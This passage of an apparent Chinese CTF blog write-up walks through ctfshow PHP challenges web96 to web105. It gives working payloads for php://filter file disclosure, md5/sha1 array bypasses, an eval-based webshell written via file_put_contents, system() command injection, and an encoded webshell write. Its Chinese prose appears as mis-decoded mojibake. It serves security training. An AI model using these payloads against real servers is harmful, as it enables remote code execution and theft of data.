class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">highlight_file() <span class="comment">//è¯¥å‡½æ•°å¯ä»¥åŒ…å«æ–‡ä»¶,å¯ä»¥åŠ ç›¸å¯¹è·¯å¾„çš„æ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥ç”¨phpä¸ºåè®®</span></span><br></pre></td></tr></table></figure><p>payloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?u=/<span class="keyword">var</span>/www/html/flag.php</span><br><span class="line">?u=php:<span class="comment">//filter/resource=flag.php</span></span><br></pre></td></tr></table></figure><h2 id="web97"><a href="#web97" class="headerlink" title="web97"></a>web97</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-18 19:36:32</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] != <span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])</span><br><span class="line"><span class="keyword">if</span> (md5(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === md5(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>çœ‹é¢˜åè¦æ˜ç™½æœ¬é¢˜è€ƒå¯Ÿmd5ï¼ˆï¼‰çš„æ¯”è¾ƒï¼Œæˆ‘ä»¬è¦çŸ¥é“ï¼Œmd5æ— æ³•å¤„ç†æ•°ç»„ï¼Œä½†MD5å¤„ç†æ•°ç»„æ—¶ä¼šè¿”å›ä¸ºnullï¼Œå› æ­¤æ„é€ è·¯å¾„ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a[]=<span class="number">2</span>&amp;b[]=<span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="web98"><a href="#web98" class="headerlink" title="web98"></a>web98</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$_GET</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_POST</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_COOKIE</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_SERVER</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line">highlight_file(<span class="variable">$_GET</span>[<span class="string">&#x27;HTTP_FLAG&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$flag</span>:<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>çœ‹ä»£ç å‘ç°æœ¬é¢˜ä»…ä»…æ˜¯è®©postå€¼è¦†ç›–getçš„å€¼ï¼Œå› æ­¤ï¼Œgetæ–¹å¼éšä¾¿ä¼ ä¸€ä¸ªå‚æ•°ï¼Œä¹‹åPOSTä¼ å‚HTTP_FLAG=flagã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET  ?flag=<span class="number">1</span>  ;POST  HTTP_FLAG=flag</span><br></pre></td></tr></table></figure><h2 id="web-99"><a href="#web-99" class="headerlink" title="web 99"></a>web 99</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-18 22:36:12</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$allow</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">36</span>; <span class="variable">$i</span> &lt; <span class="number">0x36d</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">    array_push(<span class="variable">$allow</span>, rand(<span class="number">1</span>,<span class="variable">$i</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>]) &amp;&amp; in_array(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$allow</span>))&#123;</span><br><span class="line">    file_put_contents(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ ¹æ®é¢˜æ„å¯ä»¥çœ‹å‡ºç›´æ¥åˆ›å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œå¹¶å°†ä¸€å¥è¯æœ¨é©¬å†™å…¥å³å¯ã€‚<br>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get ?n=<span class="number">1</span>.php  POST <span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="web100"><a href="#web100" class="headerlink" title="web100"></a>web100</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-21 22:10:28</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;ctfshow.php&quot;</span>);</span><br><span class="line"><span class="comment">//flag in class ctfshow;</span></span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="keyword">new</span> ctfshow();</span><br><span class="line"><span class="variable">$v1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v0</span>=is_numeric(<span class="variable">$v1</span>) <span class="keyword">and</span> is_numeric(<span class="variable">$v2</span>) <span class="keyword">and</span> is_numeric(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v0</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;/&quot;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/\;/&quot;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="subst">$v3</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ ¹æ®é¢˜æ„ï¼Œå¯ä»¥å‘ç°æœ¬é¢˜è€ƒæŸ¥andä¸&amp;&amp;çš„åŒºåˆ«+åå°„ç±»ReflectionClassçš„ä½¿ç”¨<br>ï¼ˆ&amp;&amp;&gt;=&gt;andï¼‰<br>å› æ­¤æœ¬é¢˜ä¼šå…ˆæ‰§è¡Œ=ï¼Œandå¯ä»¥ä¸æˆç«‹ã€‚<br>ä¹‹åæ˜¯åˆ©ç”¨PHPä¸­çš„åå°„ç±»ReflectionClassï¼Œå› ä¸ºå·²ç»æç¤ºäº†flagåœ¨ctfshowè¿™ä¸ªç±»é‡Œ<a href="https://www.php.net/manual/zh/class.reflectionclass.php">phpå®˜ç½‘ä¸Šåå°„ç±»</a><br>yunå¸ˆå‚…ä¸¾ä¸ªç®€å•çš„ä¾‹å­ï¼›ä»¥ä¾›å­¦ä¹ ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$flag</span>=<span class="string">&quot;flag&#123;123123123&#125;&quot;</span>;</span><br><span class="line"><span class="keyword">const</span>  PI=<span class="number">3.14</span>;</span><br><span class="line"><span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">hello</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hello&lt;/br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> ReflectionClass(<span class="string">&#x27;A&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">var_dump(<span class="variable">$a</span>-&gt;getConstants());  è·å–ä¸€ç»„å¸¸é‡</span><br><span class="line">è¾“å‡º</span><br><span class="line"> <span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="string">&quot;PI&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">float</span>(<span class="number">3.14</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var_dump(<span class="variable">$a</span>-&gt;getName());    è·å–ç±»å</span><br><span class="line">è¾“å‡º</span><br><span class="line"><span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;A&quot;</span></span><br><span class="line"></span><br><span class="line">var_dump(<span class="variable">$a</span>-&gt;getStaticProperties()); è·å–é™æ€å±æ€§</span><br><span class="line">è¾“å‡º</span><br><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="string">&quot;flag&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">15</span>) <span class="string">&quot;flag&#123;123123123&#125;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var_dump(<span class="variable">$a</span>-&gt;getMethods()); è·å–ç±»ä¸­çš„æ–¹æ³•</span><br><span class="line">è¾“å‡º</span><br><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  <span class="keyword">object</span>(ReflectionMethod)<span class="comment">#2 (2) &#123;</span></span><br><span class="line">    [<span class="string">&quot;name&quot;</span>]=&gt;</span><br><span class="line">    <span class="keyword">string</span>(<span class="number">5</span>) <span class="string">&quot;hello&quot;</span></span><br><span class="line">    [<span class="string">&quot;class&quot;</span>]=&gt;</span><br><span class="line">    <span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;A&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>é¢„æœŸè§£ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=<span class="number">1</span>&amp;v2=<span class="keyword">echo</span> <span class="keyword">new</span> ReflectionClass&amp;v3=;</span><br></pre></td></tr></table></figure><p>æœ¬é¢˜æœ‰éé¢„æœŸè§£ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=<span class="number">1</span>&amp;v2=system(<span class="string">&quot;cat ctfshow.php&quot;</span>)<span class="comment">/*&amp;v3=*/</span>;</span><br></pre></td></tr></table></figure><h2 id="web101"><a href="#web101" class="headerlink" title="web101"></a>web101</h2><p>åŒä¸Šä¸€é¢˜ç›¸ä¼¼ï¼Œï¼ˆéé¢„æœŸè§£æ¶ˆå¤±ï¼‰</p><h2 id="web102"><a href="#web102" class="headerlink" title="web102"></a>web102</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: atao</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-23 20:59:43</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v4</span> = is_numeric(<span class="variable">$v2</span>) <span class="keyword">and</span> is_numeric(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v4</span>)&#123;</span><br><span class="line">    <span class="variable">$s</span> = substr(<span class="variable">$v2</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="variable">$str</span> = call_user_func(<span class="variable">$v1</span>,<span class="variable">$s</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">    file_put_contents(<span class="variable">$v3</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>çœ‹åˆ°æœ¬é¢˜åï¼Œå‘ç°v2è¦ä¸ºå…¨æ•°å­—ï¼Œv1åº”ä¸ºä¸€ä¸ªå†…ç½®ç±»ï¼Œv3ä¸ºæ–‡ä»¶å<br>çœ‹åˆ°è¿™é‡Œæˆ‘ä»¬å¯ä»¥æƒ³åˆ°16è¿›åˆ¶ç»•è¿‡is_numeric()ã€‚<br>ä¹‹åä¾¿ä¸çŸ¥é“äº†</p><blockquote><p>call_user_func â€” æŠŠç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºå›è°ƒå‡½æ•°è°ƒç”¨<br>1.é€šè¿‡å‡½æ•°çš„æ–¹å¼å›è°ƒ  2.é€šè¿‡ç±»åã€å¯¹è±¡çš„æ–¹å¼å›è°ƒ 3.ç”¨call_user_func()æ¥è°ƒç”¨ä¸€ä¸ªç±»é‡Œé¢çš„æ–¹æ³•<br>$s = substr($v2,2) æˆªå–v2ä¸­å‰ä¸¤ä¸ªå­—ç¬¦</p></blockquote><p>çœ‹åˆ°å¤§ä½¬åšå®¢<br>paylaod<br>é¦–å…ˆå°†æˆ‘ä»¬çš„ä¸€å¥è¯ç¼–ç æˆ16è¿›åˆ¶</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">get:v2=<span class="number">0x3c3f706870206576616c28245f504f53545b315d293b3f3e</span>&amp;v3=<span class="number">1</span>.php</span><br><span class="line">post:v1=hex2bin</span><br></pre></td></tr></table></figure><p>å®Œæˆæœ¨é©¬çš„å†™å…¥ã€‚<br>ä½†æ˜¯æœ¬é¢˜æ— æ³•ä½¿ç”¨ï¼Œåº”è¯¥æ˜¯å› ä¸ºç¯å¢ƒä¸ºphp7ï¼Œå› ä¸ºåœ¨php7ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var_dump(is_numeric(<span class="string">&quot;0x3c3f706870206576616c28245f504f53545b315d293b3f3e&quot;</span>));  </span><br><span class="line">ä¸‹è¿”å›<span class="literal">false</span></span><br></pre></td></tr></table></figure><p>æ‰€ä»¥åªèƒ½å¦æƒ³åŠæ³•ï¼Œè¦è®©v2å‡ä¸ºæ•°å­—ï¼Œé¦–å…ˆæˆ‘ä»¬è€ƒè™‘å†™å…¥1.phpæ—¶ï¼Œåˆ©ç”¨ä¼ªåè®®å†™å…¥</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">get:v2=ï¼Ÿï¼Ÿï¼Ÿ&amp;v3=php:<span class="comment">//filter/write=convert.base64-decode/resource=1.php</span></span><br><span class="line">post: v1=hex2bin</span><br></pre></td></tr></table></figure><p>å…³é”®å°±æ˜¯ä»€ä¹ˆä»£ç base64ç¼–ç åå†è½¬ä¸ºåå…­è¿›åˆ¶ä¸ºå…¨æ•°å­—</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;&lt;?=`cat *`;&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span>=base64_encode(<span class="variable">$a</span>);  <span class="comment">// PD89YGNhdCAqYDs=</span></span><br><span class="line"><span class="variable">$c</span>=bin2hex(<span class="variable">$b</span>);</span><br></pre></td></tr></table></figure><p>åŒæ—¶å› ä¸ºç»è¿‡substrå¤„ç†ï¼Œæ‰€ä»¥v2å‰é¢è¿˜è¦è¡¥00<br>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">get:v2=<span class="number">005044383959474e6864434171594473</span>&amp;v3=php:<span class="comment">//filter/write=convert.base64-decode/resource=1.php</span></span><br><span class="line">post: v1=hex2bin</span><br></pre></td></tr></table></figure><p>ä¹‹åè®¿é—®1.phpçœ‹æºç å³å¯ã€‚</p><h2 id="web103"><a href="#web103" class="headerlink" title="web103"></a>web103</h2><p>åŒä¸Šä¸€æ ·ï¼Œè·¯å¾„ç›¸åŒ</p><h2 id="web104ã€106"><a href="#web104ã€106" class="headerlink" title="web104ã€106"></a>web104ã€106</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: atao</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-28 22:27:20</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(sha1(<span class="variable">$v1</span>)==sha1(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>é€šè¿‡åˆ©ç”¨æ•°ç»„ç»•è¿‡shal();<br>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">post:v1[]=<span class="number">1</span>;get v2[]=<span class="number">2</span>;</span><br></pre></td></tr></table></figure><h2 id="web-105"><a href="#web-105" class="headerlink" title="web 105"></a>web 105</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$error</span>=<span class="string">&#x27;ä½ è¿˜æƒ³è¦flagå˜›ï¼Ÿ&#x27;</span>;</span><br><span class="line"><span class="variable">$suces</span>=<span class="string">&#x27;æ—¢ç„¶ä½ æƒ³è¦é‚£ç»™ä½ å§ï¼&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span>===<span class="string">&#x27;error&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$$value</span>;</span><br><span class="line">&#125;<span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$value</span>===<span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]==<span 